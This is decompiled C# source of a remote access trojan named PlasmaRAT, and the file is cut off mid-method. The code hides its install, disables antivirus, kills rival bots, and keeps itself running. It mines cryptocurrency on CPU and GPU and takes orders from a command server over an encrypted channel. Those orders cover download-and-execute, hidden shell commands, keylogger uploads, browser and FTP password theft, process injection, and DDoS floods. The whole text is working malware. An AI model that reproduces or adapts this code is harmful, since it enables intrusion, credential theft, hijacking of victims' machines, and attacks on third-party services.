using System;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using System.Timers;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using System_Configuration.My;
using System_Configuration.My.Resources;

namespace System_Configuration
{
	// Token: 0x02000012 RID: 18
	[StandardModule]
	public sealed class PlasmaRAT
	{
		// Token: 0x14000003 RID: 3
		// (add) Token: 0x0600005F RID: 95 RVA: 0x0000241D File Offset: 0x0000061D
		// (remove) Token: 0x06000060 RID: 96 RVA: 0x00002434 File Offset: 0x00000634
		private static event PlasmaRAT.MessageReceived MSG;

		// Token: 0x06000061 RID: 97 RVA: 0x0000636C File Offset: 0x0000456C
		[STAThread]
		[MethodImpl(MethodImplOptions.NoOptimization)]
		public static void main()
		{
			try
			{
				string text = PlasmaRAT.DecryptConfig(Resources.A);
				string text2 = text.Trim();
				PlasmaRAT.Settings = text2.Split(new char[]
				{
					'*'
				});
				PlasmaRAT.Server = PlasmaRAT.Settings[1];
				PlasmaRAT.port = Convert.ToInt32(PlasmaRAT.Settings[2]);
				PlasmaRAT.Username = PlasmaRAT.Settings[3];
				PlasmaRAT.RunFileAs = PlasmaRAT.Settings[4];
				PlasmaRAT.InstallFolder = PlasmaRAT.Settings[5];
				PlasmaRAT.WhatToRun = PlasmaRAT.Settings[6];
				PlasmaRAT.BackupDNS = PlasmaRAT.Settings[7];
			}
			catch (Exception ex)
			{
				Thread.Sleep(-1);
			}
			try
			{
				if (Application.ExecutablePath.Contains("HardwareCheck.exe"))
				{
					AVKill.Start();
					Disablers.Disable();
					if (PlasmaRAT.WhatToRun.Contains("bk"))
					{
						BotKillers.RunStandardBotKiller();
					}
					Random random = new Random();
					MyProject.Computer.FileSystem.MoveFile(Application.ExecutablePath, Path.GetTempPath() + random.Next(1000, 9000).ToString());
					ProjectData.EndApp();
				}
			}
			catch (Exception ex2)
			{
			}
			try
			{
				if (AntiEverything.IsAdmin())
				{
					if (!PlasmaRAT.WhatToRun.Contains("z"))
					{
						AntiEverything.AntisDetected = true;
					}
					PlasmaRAT.InstallationOfEverything = Environment.GetFolderPath(Environment.SpecialFolder.System) + "\\" + PlasmaRAT.InstallFolder + "\\";
				}
				else
				{
					PlasmaRAT.InstallationOfEverything = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData) + "\\" + PlasmaRAT.InstallFolder + "\\";
				}
			}
			catch (Exception ex3)
			{
				PlasmaRAT.InstallationOfEverything = Environment.GetEnvironmentVariable("PROGRAMDATA") + "\\" + PlasmaRAT.InstallFolder + "\\";
			}
			PlasmaRAT.InstallBot();
			try
			{
				PlasmaRAT.OneBotOnly = new Mutex(false, "4919245");
				if (!PlasmaRAT.OneBotOnly.WaitOne(0, false))
				{
					PlasmaRAT.OneBotOnly.Close();
					PlasmaRAT.OneBotOnly = null;
					Thread.Sleep(100);
					if (PlasmaRAT.InstalledSuccessfully)
					{
						try
						{
							Random random2 = new Random();
							MyProject.Computer.FileSystem.MoveFile(Application.ExecutablePath, Path.GetTempPath() + random2.Next(1000, 9000).ToString());
						}
						catch (Exception ex4)
						{
						}
					}
					ProjectData.EndApp();
				}
			}
			catch (Exception ex5)
			{
			}
			Logger.StartLogger();
			PlasmaRAT.startbot();
		}

		// Token: 0x06000062 RID: 98 RVA: 0x0000662C File Offset: 0x0000482C
		public static void startbot()
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				PlasmaRAT.IRCThread.Start();
				IL_13:
				num2 = 3;
				if (!PlasmaRAT.WhatToRun.Contains("q"))
				{
					goto IL_2D;
				}
				IL_26:
				num2 = 4;
				ProcessAccessRights.ProtectCurrentProcess();
				IL_2D:
				num2 = 6;
				System.Timers.Timer timer = new System.Timers.Timer(30000.0);
				IL_3E:
				num2 = 7;
				timer.Elapsed += delegate(object sender, ElapsedEventArgs e)
				{
					PlasmaRAT.ProactiveBK();
				};
				IL_52:
				num2 = 8;
				System.Timers.Timer timer2 = new System.Timers.Timer(5000.0);
				IL_63:
				num2 = 9;
				timer2.Elapsed += delegate(object sender, ElapsedEventArgs e)
				{
					Persistence.Startup();
				};
				IL_78:
				num2 = 10;
				System.Timers.Timer timer3 = new System.Timers.Timer(5000.0);
				IL_8B:
				num2 = 11;
				timer3.Elapsed += delegate(object sender, ElapsedEventArgs e)
				{
					Injection.LoadPersitenceEngine();
				};
				IL_A1:
				num2 = 12;
				System.Timers.Timer timer4 = new System.Timers.Timer(5000.0);
				IL_B4:
				num2 = 13;
				timer4.Elapsed += delegate(object sender, ElapsedEventArgs e)
				{
					Miner.MinerThreader();
				};
				IL_CA:
				num2 = 14;
				timer4.Start();
				IL_D4:
				num2 = 15;
				System.Timers.Timer timer5 = new System.Timers.Timer(5000.0);
				IL_E7:
				num2 = 16;
				timer5.Elapsed += delegate(object sender, ElapsedEventArgs e)
				{
					GPUMiner.GPUMinerThreader();
				};
				IL_FD:
				num2 = 17;
				timer5.Start();
				IL_107:
				num2 = 18;
				AntiEverything.RunAntis();
				IL_10F:
				num2 = 19;
				if (!PlasmaRAT.WhatToRun.Contains("z"))
				{
					goto IL_1E4;
				}
				IL_126:
				num2 = 20;
				if (!PlasmaRAT.WhatToRun.Contains("s"))
				{
					goto IL_143;
				}
				IL_13A:
				num2 = 21;
				timer2.Start();
				IL_143:
				num2 = 23;
				if (!PlasmaRAT.WhatToRun.Contains("i"))
				{
					goto IL_161;
				}
				IL_157:
				num2 = 24;
				timer3.Start();
				IL_161:
				num2 = 26;
				timer.Start();
				IL_16A:
				num2 = 27;
				if (!PlasmaRAT.WhatToRun.Contains("a"))
				{
					goto IL_198;
				}
				IL_17E:
				num2 = 28;
				PlasmaRAT.AVKillThread.Start();
				IL_18B:
				num2 = 29;
				PlasmaRAT.ProactiveAV.Start();
				IL_198:
				num2 = 31;
				if (!PlasmaRAT.WhatToRun.Contains("c"))
				{
					goto IL_1B4;
				}
				IL_1AC:
				num2 = 32;
				SetProcCritical.CriticalProcess();
				IL_1B4:
				num2 = 34;
				if (!PlasmaRAT.WhatToRun.Contains("bk"))
				{
					goto IL_1E4;
				}
				IL_1C8:
				num2 = 35;
				Interaction.SaveSetting("Microsoft", "Sysinternals", "BK", "active");
				IL_1E4:
				num2 = 38;
				Miner.BeginMiner();
				IL_1EC:
				num2 = 39;
				GPUMiner.BeginGPUMiner();
				IL_1F4:
				num2 = 40;
				Disablers.Disable();
				IL_1FC:
				goto IL_2F6;
				IL_201:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_2B5:
				goto IL_2EB;
				IL_2B7:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_2C8:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_2B7;
			}
			IL_2EB:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_2F6:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x06000063 RID: 99 RVA: 0x00006954 File Offset: 0x00004B54
		public static void InstallBot()
		{
			try
			{
				DirectoryInfo directoryInfo = new DirectoryInfo(PlasmaRAT.InstallationOfEverything);
				if (!directoryInfo.Exists)
				{
					directoryInfo.Create();
					try
					{
						directoryInfo.Attributes = (FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed);
					}
					catch (Exception ex)
					{
					}
				}
				if (!AntiEverything.AntisDetected)
				{
					string text = PlasmaRAT.InstallationOfEverything + PlasmaRAT.RunFileAs;
					if (!Application.ExecutablePath.Contains(PlasmaRAT.RunFileAs))
					{
						if (!MyProject.Computer.FileSystem.FileExists(text))
						{
							try
							{
								PlasmaRAT.DeleteFile(Application.ExecutablePath + ":Zone.Identifier");
							}
							catch (Exception ex2)
							{
							}
							MyProject.Computer.FileSystem.CopyFile(Application.ExecutablePath, text);
							Process.Start(text);
							try
							{
								FileInfo fileInfo = new FileInfo(text);
								fileInfo.Attributes = (FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed);
							}
							catch (Exception ex3)
							{
							}
							try
							{
								FileInfo fileInfo2 = new FileInfo(Application.ExecutablePath);
								fileInfo2.Attributes = (FileAttributes.ReadOnly | FileAttributes.Hidden | FileAttributes.System | FileAttributes.NotContentIndexed);
							}
							catch (Exception ex4)
							{
							}
							PlasmaRAT.InstalledSuccessfully = true;
							Thread.Sleep(30000);
						}
						else
						{
							Persistence.AllowAccess(PlasmaRAT.InstallationOfEverything);
							Persistence.AllowAccess(text);
							FileInfo fileInfo3 = new FileInfo(text);
							fileInfo3.Attributes = FileAttributes.Normal;
							Thread.Sleep(500);
							MyProject.Computer.FileSystem.DeleteFile(text);
							File.Copy(Application.ExecutablePath, text);
							Process.Start(text);
							PlasmaRAT.InstalledSuccessfully = true;
							Thread.Sleep(30000);
						}
					}
				}
			}
			catch (Exception ex5)
			{
			}
		}

		// Token: 0x06000064 RID: 100 RVA: 0x00006B58 File Offset: 0x00004D58
		public static void connect()
		{
			try
			{
				PlasmaRAT.IRC = new TcpClient(PlasmaRAT.Server, PlasmaRAT.port);
				PlasmaRAT.Send(string.Format(Conversions.ToString(Operators.ConcatenateObject("BOT*", PlasmaRAT.BotName())), new object[0]));
				if (!PlasmaRAT.keepalive)
				{
					PlasmaRAT.keepalive = true;
					Thread thread = new Thread(new ThreadStart(PlasmaRAT.SendPing));
					thread.Start();
				}
				if (!PlasmaRAT.readlines)
				{
					PlasmaRAT.readlines = true;
					PlasmaRAT.MSG += PlasmaRAT.Parsecommands;
				}
				PlasmaRAT.IRC.GetStream().BeginRead(new byte[]
				{
					0
				}, 0, 0, new AsyncCallback(PlasmaRAT.lmfao), null);
			}
			catch (Exception ex)
			{
				try
				{
					if (PlasmaRAT.WhatToRun.Contains("y"))
					{
						if (Operators.CompareString(PlasmaRAT.Server, PlasmaRAT.Settings[1], false) == 0)
						{
							PlasmaRAT.Server = PlasmaRAT.BackupDNS;
						}
						else
						{
							PlasmaRAT.Server = PlasmaRAT.Settings[1];
						}
					}
					PlasmaRAT.IRC.Close();
				}
				catch (Exception ex2)
				{
				}
				Thread.Sleep(10000);
				PlasmaRAT.connect();
			}
		}

		// Token: 0x06000065 RID: 101 RVA: 0x00006CA4 File Offset: 0x00004EA4
		public static void SendPing()
		{
			for (;;)
			{
				try
				{
					PlasmaRAT.Send("l");
				}
				catch (Exception ex)
				{
				}
				Thread.Sleep(60000);
			}
		}

		// Token: 0x06000066 RID: 102 RVA: 0x00006CE4 File Offset: 0x00004EE4
		public static void lmfao(IAsyncResult ar)
		{
			try
			{
				PlasmaRAT.Read = new StreamReader(PlasmaRAT.IRC.GetStream());
				PlasmaRAT.MessageReceived msgevent = PlasmaRAT.MSGEvent;
				if (msgevent != null)
				{
					msgevent(PlasmaRAT.AES_Decrypt(PlasmaRAT.Read.ReadLine()));
				}
				PlasmaRAT.IRC.GetStream().BeginRead(new byte[]
				{
					0
				}, 0, 0, new AsyncCallback(PlasmaRAT.lmfao), null);
			}
			catch (Exception ex)
			{
				Thread.Sleep(1000);
				try
				{
					PlasmaRAT.IRC.Close();
				}
				catch (Exception ex2)
				{
				}
				PlasmaRAT.connect();
			}
		}

		// Token: 0x06000067 RID: 103 RVA: 0x00006DA0 File Offset: 0x00004FA0
		public static object BotName()
		{
			object result;
			try
			{
				string text = "";
				string str = string.Empty;
				text += "1.7";
				try
				{
					text = text + "*" + PlasmaRAT.Getcn.g() + "";
				}
				catch (Exception ex)
				{
					text += "*Error";
				}
				try
				{
					if (Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).Contains("x86"))
					{
						str = "x64*";
					}
					else
					{
						str = "x86*";
					}
				}
				catch (Exception ex2)
				{
					str = "*x86*";
				}
				try
				{
					string osfullName = MyProject.Computer.Info.OSFullName;
					if (osfullName.Contains("XP"))
					{
						text = text + "*Windows XP " + str;
					}
					if (osfullName.Contains("Windows 7"))
					{
						text = text + "*Windows 7 " + str;
					}
					if (osfullName.Contains("Vista"))
					{
						text = text + "*Windows Vista " + str;
					}
					if (osfullName.Contains("Windows 8"))
					{
						text = text + "*Windows 8 " + str;
					}
					if (osfullName.Contains("Server"))
					{
						text = text + "*Windows Server " + str;
					}
					if (osfullName.Contains("Windows 10"))
					{
						text = text + "*Windows 10 " + str;
					}
					if (!text.Contains("Windows"))
					{
						text = text + "*Unknown OS " + str;
					}
				}
				catch (Exception ex3)
				{
					text = text + "*Windows " + str;
				}
				try
				{
					string userName = Environment.UserName;
					if (Operators.CompareString(userName, string.Empty, false) != 0)
					{
						text = text + "" + userName + "*";
					}
					else
					{
						text += "Error*";
					}
				}
				catch (Exception ex4)
				{
					text += "Error*";
				}
				try
				{
					int processorCount = Environment.ProcessorCount;
					object right;
					if (processorCount == 1)
					{
						right = "1 Core";
					}
					else
					{
						right = processorCount.ToString() + " Cores";
					}
					text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(text + "", right), "*"));
				}
				catch (Exception ex5)
				{
					text += "N/A*";
				}
				try
				{
					if (AntiEverything.IsAdmin())
					{
						text += "Admin*";
					}
					else
					{
						text += "User*";
					}
				}
				catch (Exception ex6)
				{
					text += "Error*";
				}
				text = text;
				result = text;
			}
			catch (Exception ex7)
			{
			}
			return result;
		}

		// Token: 0x06000068 RID: 104 RVA: 0x000070BC File Offset: 0x000052BC
		[MethodImpl(MethodImplOptions.NoOptimization)]
		public static void Parsecommands(string Input)
		{
			try
			{
				string[] array = Strings.Split(Input, " ", -1, CompareMethod.Binary);
				string left = array[0];
				if (Operators.CompareString(left, "RECONNECT", false) == 0)
				{
					PlasmaRAT.IRC.Close();
				}
				else if (Operators.CompareString(left, "seed", false) == 0)
				{
					Torrent.SeedTorrent(array[1]);
				}
				else if (Operators.CompareString(left, "miner.start", false) == 0)
				{
					Miner.InstallMiner(array[1], array[2], array[3], array[4]);
				}
				else if (Operators.CompareString(left, "miner.stop", false) == 0)
				{
					Miner.RemoveMiner();
				}
				else if (Operators.CompareString(left, "miner.gpu.start", false) == 0)
				{
					if (!MyProject.Computer.Info.OSFullName.Contains("XP"))
					{
						GPUMiner.InstallGPUMiner(array[1], array[2], array[3], array[4]);
					}
				}
				else if (Operators.CompareString(left, "miner.reset", false) == 0)
				{
					Persistence.AllowAccess(PlasmaRAT.InstallationOfEverything);
					if (File.Exists(Conversions.ToString(Miner.PoolerMiner)))
					{
						Persistence.AllowAccess(Conversions.ToString(Miner.PoolerMiner));
						File.Delete(Conversions.ToString(Miner.PoolerMiner));
					}
					if (File.Exists(Conversions.ToString(GPUMiner.GPUMinerFile)))
					{
						Persistence.AllowAccess(Conversions.ToString(GPUMiner.GPUMinerFile));
						File.Delete(Conversions.ToString(GPUMiner.GPUMinerFile));
					}
					PlasmaRAT.TalktoChannel("Reset Miner Successfully!", string.Empty);
				}
				else if (Operators.CompareString(left, "miner.gpu.stop", false) == 0)
				{
					GPUMiner.RemoveGPUMiner();
				}
				else if (Operators.CompareString(left, "FileManager", false) != 0)
				{
					if (Operators.CompareString(left, "keylogger.send", false) == 0)
					{
						Logger.SendLogs();
					}
					else if (Operators.CompareString(left, "keylogger.delete", false) == 0)
					{
						Logger.DeleteLogs();
					}
					else if (Operators.CompareString(left, "keylogger.search", false) == 0)
					{
						string[] array2 = Strings.Split(Input, "\"", -1, CompareMethod.Binary);
						Logger.SearchLogs(array2[1]);
					}
					else if (Operators.CompareString(left, "download", false) == 0)
					{
						string text = Path.GetTempPath() + array[2];
						if (!File.Exists(text))
						{
							WebClient webClient = new WebClient();
							webClient.DownloadFile(array[1], text);
							Process.Start(text);
							PlasmaRAT.TalktoChannel("Download and Execute Successful. Location: " + text, string.Empty);
						}
						else
						{
							PlasmaRAT.TalktoChannel("File name " + array[2] + " already used. Ignoring Execute File", string.Empty);
						}
					}
					else if (Operators.CompareString(left, "update.bot", false) == 0)
					{
						string text2 = Path.GetTempPath() + array[2];
						if (!MyProject.Computer.FileSystem.FileExists(text2))
						{
							WebClient webClient2 = new WebClient();
							webClient2.DownloadFile(array[1], text2);
							try
							{
								PlasmaRAT.OneBotOnly.Close();
							}
							catch (Exception ex)
							{
							}
							PlasmaRAT.TalktoChannel("Bot Update Successful! Uninstalling...", "");
							Process.Start(text2);
							SetProcCritical.NonCriticalProcess();
							BotKillers.KillFile(Application.ExecutablePath);
							ProjectData.EndApp();
							Environment.Exit(0);
						}
						else
						{
							PlasmaRAT.TalktoChannel("File name " + array[2] + " already used. Ignoring Update.", string.Empty);
						}
					}
					else if (Operators.CompareString(left, "visit", false) == 0)
					{
						if (Operators.CompareString(array[1], "-h", false) == 0)
						{
							Process.Start(new ProcessStartInfo
							{
								FileName = "iexplore.exe",
								Arguments = array[2],
								WindowStyle = ProcessWindowStyle.Hidden
							});
							PlasmaRAT.TalktoChannel("Visited Site Hidden: ", array[2]);
						}
						else
						{
							Process.Start(array[1]);
							PlasmaRAT.TalktoChannel("Visited Site: ", array[1]);
						}
					}
					else if (Operators.CompareString(left, "ddos.slowloris.start", false) == 0)
					{
						Slowloris.StartSlowloris(array[1], Conversions.ToInteger(array[3]), Conversions.ToInteger(array[2]), "");
					}
					else if (Operators.CompareString(left, "ddos.arme.start", false) == 0)
					{
						ARME.StartARME(array[1], Conversions.ToInteger(array[3]), Conversions.ToInteger(array[2]), "");
					}
					else if (Operators.CompareString(left, "ddos.posthttp.start", false) == 0)
					{
						string[] array3 = Strings.Split(Input, "\"", -1, CompareMethod.Binary);
						PostHTTP.StartPOSTHTTP(array[1], Conversions.ToInteger(array[3]), Conversions.ToInteger(array[2]), array3[1]);
					}
					else if (Operators.CompareString(left, "ddos.httpget.start", false) == 0)
					{
						BandwidthFlood.StartHTTPGet(array[1], Conversions.ToInteger(array[3]), Conversions.ToInteger(array[2]));
					}
					else if (Operators.CompareString(left, "ddos.bwflood.start", false) == 0)
					{
						HTTPGet.StartBandwidthFlood(array[1], Conversions.ToInteger(array[3]), Conversions.ToInteger(array[2]));
					}
					else if (Operators.CompareString(left, "ddos.udp.start", false) == 0)
					{
						UDP.StartUDP(array[1], Conversions.ToInteger(array[4]), Conversions.ToInteger(array[3]), Conversions.ToInteger(array[2]));
					}
					else if (Operators.CompareString(left, "ddos.condis.start", false) == 0)
					{
						Condis.StartCondis(array[1], Conversions.ToInteger(array[4]), Conversions.ToInteger(array[3]), Conversions.ToInteger(array[2]));
					}
					else
					{
						if (Operators.CompareString(left, "hosts", false) == 0)
						{
							try
							{
								string[] array4 = Strings.Split(Input, "\"", -1, CompareMethod.Binary);
								File.AppendAllText("C:\\windows\\system32\\drivers\\etc\\hosts", "\r\n" + array4[1]);
								PlasmaRAT.TalktoChannel("Added to HOSTS.", "");
								goto IL_7C6;
							}
							catch (Exception ex2)
							{
								PlasmaRAT.TalktoChannel("Unable to add to HOSTS.", "");
								goto IL_7C6;
							}
						}
						if (Operators.CompareString(left, ".avdetails", false) == 0)
						{
							string blue = PlasmaRAT.GetAntiVirus() + ". " + PlasmaRAT.GetFirewall();
							PlasmaRAT.TalktoChannel(blue, "");
						}
						else if (Operators.CompareString(left, "ftp", false) == 0)
						{
							PlasmaRAT.ftpsteal();
						}
						else if (Operators.CompareString(left, "browsers", false) == 0)
						{
							Passwords.passwordsz();
						}
						else if (Operators.CompareString(left, "info", false) == 0)
						{
							PlasmaRAT.TalktoChannel("Running At: " + Application.ExecutablePath + ".", string.Empty);
						}
						else if (Operators.CompareString(left, "pcspecs", false) == 0)
						{
							PlasmaRAT.TalktoChannel(string.Concat(new string[]
							{
								"CPU: ",
								PlasmaRAT.GetCPU(),
								". GPU: ",
								PlasmaRAT.GetVideoCard(),
								" RAM: ",
								Strings.Format(MyProject.Computer.Info.TotalPhysicalMemory / 1024.0 / 1024.0 / 1024.0, "###,###,##0 GB")
							}), string.Empty);
						}
						else if (Operators.CompareString(left, "shell", false) == 0)
						{
							string[] array5 = Strings.Split(Input, "\"", -1, CompareMethod.Binary);
							Interaction.Shell(array5[1], AppWinStyle.Hide, false, -1);
							PlasmaRAT.TalktoChannel("Shell Command Executed.", "");
						}
						else if (Operators.CompareString(left, "remove.bot", false) == 0)
						{
							SetProcCritical.NonCriticalProcess();
							BotKillers.KillFile(Application.ExecutablePath);
							ProjectData.EndApp();
							Environment.Exit(0);
						}
					}
				}
				IL_7C6:
				if (Input.Contains("mute"))
				{
					if (Operators.CompareString(array[1], "on", false) == 0)
					{
						PlasmaRAT.Muted = true;
					}
					if (Operators.CompareString(array[1], "off", false) == 0)
					{
						PlasmaRAT.Muted = false;
					}
				}
				if (Input.Contains("inject"))
				{
					WebClient webClient3 = new WebClient();
					byte[] array6 = webClient3.DownloadData(array[1]);
					if (Input.Contains("reflect"))
					{
						PlasmaRAT.ReflectBytes(array6);
						PlasmaRAT.TalktoChannel("File reflected into Self Successfully", string.Empty);
					}
					if (Input.Contains("runpe"))
					{
						mRunpe.InjectPE(array6, RuntimeEnvironment.GetRuntimeDirectory() + "vbc.exe", string.Empty);
						PlasmaRAT.TalktoChannel("File Injected into vbc.exe Successfully", string.Empty);
					}
				}
				if (Input.Contains(".stop"))
				{
					if (Input.Contains("udp"))
					{
						UDP.StopUDP();
					}
					if (Input.Contains("arme"))
					{
						ARME.StopARME();
					}
					if (Input.Contains("slowloris"))
					{
						Slowloris.StopSlowloris();
					}
					if (Input.Contains("httpget"))
					{
						BandwidthFlood.StopHTTPGET();
					}
					if (Input.Contains("bwflood"))
					{
						HTTPGet.StopBandwidthFlood();
					}
					if (Input.Contains("posthttp"))
					{
						PostHTTP.StopPOSTHTTP();
					}
					if (Input.Contains("condis"))
					{
						Condis.StopCondis();
					}
				}
				if (Input.Contains("botkiller"))
				{
					if (Input.Contains("hardbk"))
					{
						Interaction.SaveSetting("Microsoft", "Sysinternals", "BK", "active");
						HardBK.HardBotKill();
					}
					if (Input.Contains("enable"))
					{
						Interaction.SaveSetting("Microsoft", "Sysinternals", "BK", "active");
						PlasmaRAT.TalktoChannel("Proactive Bot Killer Enabled!", " ");
					}
					if (Input.Contains("disable"))
					{
						Interaction.SaveSetting("Microsoft", "Sysinternals", "BK", "");
						PlasmaRAT.TalktoChannel("Proactive Bot Killer Disabled!", "");
					}
					if (Input.Contains("run"))
					{
						PlasmaRAT.RunBotKiller = true;
					}
				}
			}
			catch (Exception ex3)
			{
				PlasmaRAT.TalktoChannel("Error: " + ex3.ToString(), string.Empty);
			}
		}

		// Token: 0x06000069 RID: 105 RVA: 0x00007B10 File Offset: 0x00005D10
		public static void Send(string MSG)
		{
			try
			{
				PlasmaRAT.Write = new StreamWriter(PlasmaRAT.IRC.GetStream());
				PlasmaRAT.Write.WriteLine(PlasmaRAT.AES_Encrypt(MSG));
				PlasmaRAT.Write.Flush();
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600006A RID: 106 RVA: 0x00007B6C File Offset: 0x00005D6C
		public static void TalktoChannel(string blue, string red)
		{
			try
			{
				if (!PlasmaRAT.Muted)
				{
					string text = Environment.UserName.ToString();
					PlasmaRAT.Send(string.Concat(new string[]
					{
						"LOGS*",
						text,
						"*",
						blue,
						red,
						"*"
					}));
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600006B RID: 107 RVA: 0x00007BF8 File Offset: 0x00005DF8
		public static void ProactiveBK()
		{
			try
			{
				if (PlasmaRAT.RunBotKiller)
				{
					PlasmaRAT.RunBotKiller = false;
					BotKillers.RunStandardBotKiller();
				}
				if (Operators.CompareString(Interaction.GetSetting("Microsoft", "Sysinternals", "BK", ""), string.Empty, false) != 0)
				{
					BotKillers.ScanProcess();
					BotKillers.RunStartupKiller();
				}
			}
			catch (Exception ex)
			{
			}
		}

		// Token: 0x0600006C RID: 108 RVA: 0x00007C68 File Offset: 0x00005E68
		public static void Handler_SessionEnding(object sender, SessionEndingEventArgs e)
		{
			int num;
			int num4;
			object obj;
			try
			{
				IL_00:
				ProjectData.ClearProjectError();
				num = 1;
				IL_07:
				int num2 = 2;
				if (PlasmaRAT.AutoBotKill)
				{
					for (;;)
					{
						IL_1B:
						num2 = 4;
						BotKillers.RunStartupKiller();
						IL_12:
						num2 = 5;
						Thread.Sleep(10);
					}
				}
				IL_24:
				goto IL_93;
				IL_26:
				int num3 = num4 + 1;
				num4 = 0;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num3);
				IL_54:
				goto IL_88;
				IL_56:
				num4 = num2;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_66:;
			}
			catch when (endfilter(obj is Exception & num != 0 & num4 == 0))
			{
				Exception ex = (Exception)obj2;
				goto IL_56;
			}
			IL_88:
			throw ProjectData.CreateProjectError(-2146828237);
			IL_93:
			if (num4 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x0600006D RID: 109 RVA: 0x00007D20 File Offset: 0x00005F20
		public static string AES_Encrypt(string input)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			string result;
			try
			{
				byte[] array = new byte[32];
				byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(PlasmaRAT.Username));
				Array.Copy(sourceArray, 0, array, 0, 16);
				Array.Copy(sourceArray, 0, array, 15, 16);
				rijndaelManaged.Key = array;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateEncryptor();
				byte[] bytes = Encoding.ASCII.GetBytes(input);
				string text = Convert.ToBase64String(cryptoTransform.TransformFinalBlock(bytes, 0, bytes.Length));
				result = text;
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x0600006E RID: 110 RVA: 0x00007DD4 File Offset: 0x00005FD4
		public static string GetCPU()
		{
			string result;
			try
			{
				ManagementObject managementObject = new ManagementObject("Win32_Processor.deviceid=\"CPU0\"");
				managementObject.Get();
				result = managementObject["Name"].ToString();
			}
			catch (Exception ex)
			{
				result = "N/A";
			}
			return result;
		}

		// Token: 0x0600006F RID: 111 RVA: 0x00007E2C File Offset: 0x0000602C
		public static string GetVideoCard()
		{
			string result;
			try
			{
				string text = string.Empty;
				ObjectQuery query = new ObjectQuery("SELECT * FROM Win32_VideoController");
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher(query);
				try
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						text = Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(text, managementObject["Name"]), ". "));
					}
				}
				finally
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator;
					if (enumerator != null)
					{
						((IDisposable)enumerator).Dispose();
					}
				}
				result = text;
			}
			catch (Exception ex)
			{
				result = "N/A";
			}
			return result;
		}

		// Token: 0x06000070 RID: 112 RVA: 0x00007ED8 File Offset: 0x000060D8
		public static string AES_Decrypt(string input)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			string result;
			try
			{
				byte[] array = new byte[32];
				byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(PlasmaRAT.Username));
				Array.Copy(sourceArray, 0, array, 0, 16);
				Array.Copy(sourceArray, 0, array, 15, 16);
				rijndaelManaged.Key = array;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				byte[] array2 = Convert.FromBase64String(input);
				string @string = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
				result = @string;
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x06000071 RID: 113 RVA: 0x00007F8C File Offset: 0x0000618C
		public static string DecryptConfig(string input)
		{
			RijndaelManaged rijndaelManaged = new RijndaelManaged();
			MD5CryptoServiceProvider md5CryptoServiceProvider = new MD5CryptoServiceProvider();
			string result;
			try
			{
				byte[] array = new byte[32];
				byte[] sourceArray = md5CryptoServiceProvider.ComputeHash(Encoding.ASCII.GetBytes(PlasmaRAT.Password));
				Array.Copy(sourceArray, 0, array, 0, 16);
				Array.Copy(sourceArray, 0, array, 15, 16);
				rijndaelManaged.Key = array;
				rijndaelManaged.Mode = CipherMode.ECB;
				ICryptoTransform cryptoTransform = rijndaelManaged.CreateDecryptor();
				byte[] array2 = Convert.FromBase64String(input);
				string @string = Encoding.ASCII.GetString(cryptoTransform.TransformFinalBlock(array2, 0, array2.Length));
				result = @string;
			}
			catch (Exception ex)
			{
			}
			return result;
		}

		// Token: 0x06000072 RID: 114 RVA: 0x00008040 File Offset: 0x00006240
		public static string GetAntiVirus()
		{
			string result;
			try
			{
				string text = null;
				ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("\\\\" + Environment.MachineName + "\\root\\SecurityCenter2", "SELECT * FROM AntivirusProduct");
				ManagementObjectCollection managementObjectCollection = managementObjectSearcher.Get();
				try
				{
					foreach (ManagementBaseObject managementBaseObject in managementObjectCollection)
					{
						ManagementObject managementObject = (ManagementObject)managementBaseObject;
						text = managementObject["displayName"].ToString();
					}
				}
				finally
				{
					ManagementObjectCollection.ManagementObjectEnumerator enumerator;
					if (enumerator != null)
					{
						((IDisposable)enumerator).Dispose();
					}
				}
